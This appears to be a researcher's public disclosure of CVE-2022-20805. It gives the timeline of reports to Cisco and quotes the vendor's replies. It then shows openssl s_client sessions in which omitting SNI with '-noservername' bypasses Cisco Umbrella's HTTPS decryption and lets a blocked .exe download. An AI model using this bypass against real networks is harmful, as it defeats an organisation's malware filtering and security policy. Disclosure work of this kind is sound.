While doing a troubleshooting we discovered a way to bypass Cisco Umbrella decryption, as it seems we reached the end on this we decided, 3 years after having reported the issue to Cisco, to release details publicly.

This vulnerability was confirmed by Cisco TAC the 21st of September 2021:
```
The current design is that when SNI is absent in the request we are forwarding request to the end web server without
doing MITM and not looking onto TLS version/ciphers, just the same way as if for example domain in question would be
bypassed from the decryption.
That's why TLS handshake can be done with TLS versions below TLS 1.2 because choice of it completely depends what
client and server will agree on.
We are loooking into possibility to change this behaviour and we have created internal feature request to determine
if we can implement decryption even if SNI extension is not present in Client Hello.
The behaviour when domain is bypassed from decryption will remain the same: TLS handshake will be done with the TLS
version/ciphers which client and server chosed.
When domain is not bypassed from decryption and is going through SWG engine we don't support anything below TLS1.2 and
obsolete ciphers, such requests will be dropped.
```

As no fix was provided in the following months, we contacted Cisco PSIRT the 8th of March 2022 to confirm that it was considered as a security vulnerability and ask for a corresponding security notice to be published.
After discussions CVE-2022-20805 was finally assigned and the following notice was published the 20th of April 2022: https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-uswg-fdbps-xtTRKpp6

A workaround was mentionned in the notice while, from our point of view, it is not applicable in practice.

More than 2 years later, the 11th of September 2024, as still no fix was provided regarding CVE-2022-20805, we contacted Cisco PSIRT again and got at the end the below feedback:
```
Customers actually have the option to request decryption of all traffic.  However, it should be noted that due to the
product's intended design (i.e., TLS SNI must be present), as well as performance and operational impacts of enabling
this feature, this is offered as a Limited Availability (LA) by contacting umbrella-support@cisco.com.  There are
currently no plans to update the advisory as it is point in time information, however, PSIRT has coordinated with the
product team to ensure information on the related defect (CSCwb04953) is updated/maintained for customer awareness.
```

The current behavior is documented here: https://support.umbrella.com/hc/en-us/articles/4838256036756-How-Does-SWG-Handle-Traffic-Decryption-When-HTTPS-Decryption-is-Enabled

Finally, here's below how concretely Cisco Umbrella decryption can by bypassed by exploiting CVE-2022-20805:
1) When trying to download a file with .EXE extension through a standard browser we're blocked by the Umbrella policy as expected:

![alt text](CVE-2022-20805_Umbrella_EXE_blocked.PNG)

2) Using openssl we can see that Umbrella decryption applies and get the same result:
```
# openssl s_client -tls1_2 -connect raw.githubusercontent.com:443
<SNIP>
Certificate chain
0 s:C = US, ST = California, L = San Francisco, O = "Cisco Systems, Inc.", CN = raw.githubusercontent.com
   i:C = US, ST = California, L = San Francisco, O = "Cisco Systems, Inc.", CN = swg-nginx-proxy-https-334cdcf4178d.signginx.cdg1
1 s:C = US, ST = California, L = San Francisco, O = "Cisco Systems, Inc.", CN = swg-nginx-proxy-https-334cdcf4178d.signginx.cdg1
   i:O = Cisco, CN = Cisco Umbrella R1 CA
2 s:O = Cisco, CN = Cisco Umbrella R1 CA
   i:O = Cisco, CN = Cisco Umbrella Customers CA
3 s:O = Cisco, CN = Cisco Umbrella Customers CA
   i:DC = fr, DC = org-iserba, CN = Iserba-CA
<SNIP>
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Server public key is 4096 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
<SNIP>
---
GET /hcjjy/lantern-binaries/master/false.exe HTTP/1.1
Host: raw.githubusercontent.com
 
HTTP/1.1 302 Moved Temporarily
Date: Mon, 25 Apr 2022 17:18:00 GMT
Content-Length: 0
Connection: keep-alive
Location: https://block.opendns.com/swg/?server=mps-6f0293c38d8d.sigenv1.cdg1&v=eyJhbGciOiAiSFM1MTIiLCAia2lkIjogIjE1NjM1NTk3OTYifQ.eyJidHlwZSI6ICIiLCAib3JnIjogNTMyMzA3NSwgIm9pZCI6IDU4NDkwODY0MSwgImJpZCI6IDEzNDUzNjMxLCAicHJmIjogMTU5NzUwNCwgInQiOiAiMTgwMDAwMDAwMDAwMDAwMDAwMDAyMUYwMDAwMDAwMDAwMDAwMDAwIiwgImJjIjogIiIsICJ1cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hjamp5L2xhbnRlcm4tYmluYXJpZXMvbWFzdGVyL2ZhbHNlLmV4ZSIsICJmdGMiOiAiZXhlIiwgImZuYW1lcyI6ICIiLCAiYnBpZCI6IDB9.5AgSH5OCftRcqVGqiRgR3lj1SJIdzJ8xqqSpLNl3ZIuMvGoep2NHpOV1Vdaj3ltz_sYnh0sHFUh5fG4el_sp3Q
Via: HTTP/1.1 m_proxy_cdg1
Via: HTTP/1.1 s_proxy_cdg1
```

3)	Still using openssl tool, we can set no SNI using the "-noservername" parameter, by doing that the Umbrella decryption doesn’t apply anymore, all the filtering achieved through decryption, like restricting some file extensions like in this example, is not anymore applied, any file can be downloaded:
```
# openssl s_client -tls1_2 -connect raw.githubusercontent.com:443 -noservername
CONNECTED(000001A4)
<SNIP>
Certificate chain
0 s:C = US, ST = California, L = San Francisco, O = "GitHub, Inc.", CN = *.github.io
   i:C = US, O = DigiCert Inc, CN = DigiCert TLS RSA SHA256 2020 CA1
1 s:C = US, O = DigiCert Inc, CN = DigiCert TLS RSA SHA256 2020 CA1
   i:C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert Global Root CA
<SNIP>
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES128-GCM-SHA256
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
<SNIP>
---
GET /hcjjy/lantern-binaries/master/false.exe HTTP/1.1
Host: raw.githubusercontent.com
 
HTTP/1.1 200 OK
Connection: keep-alive
Content-Length: 14557208
Cache-Control: max-age=300
Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; sandbox
Content-Type: application/octet-stream
ETag: "20382cbdc623c72d3167bd9a506a97bf86c8171db852b08e8534869a8de37384"
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff
X-Frame-Options: deny
X-XSS-Protection: 1; mode=block
X-GitHub-Request-Id: A8EC:EC79:2439E05:25E2BF6:6266D7B4
Accept-Ranges: bytes
Date: Mon, 25 Apr 2022 17:27:29 GMT
Via: 1.1 varnish
X-Served-By: cache-cdg20767-CDG
X-Cache: HIT
X-Cache-Hits: 1
X-Timer: S1650907649.112261,VS0,VE16
Vary: Authorization,Accept-Encoding,Origin
Access-Control-Allow-Origin: *
X-Fastly-Request-ID: cfc13722786eb95d4f34d03d9d4bf753f478a197
Expires: Mon, 25 Apr 2022 17:32:29 GMT
Source-Age: 37
 
MZÉ           ╕       @                                   ≡   ♫▼║♫ ┤  ═!╕L═!This program cannot be run in DOS mode.
$       SAr≡↨ ∟ú↨ ∟ú↨ ∟ú¬oèú∟ ∟ú▲Xëú ∟ú0µgú∟ ∟ú↨ ↔úó ∟ú▲XÿúD ∟ú▲Xƒú█ ∟ú▲Xê
```
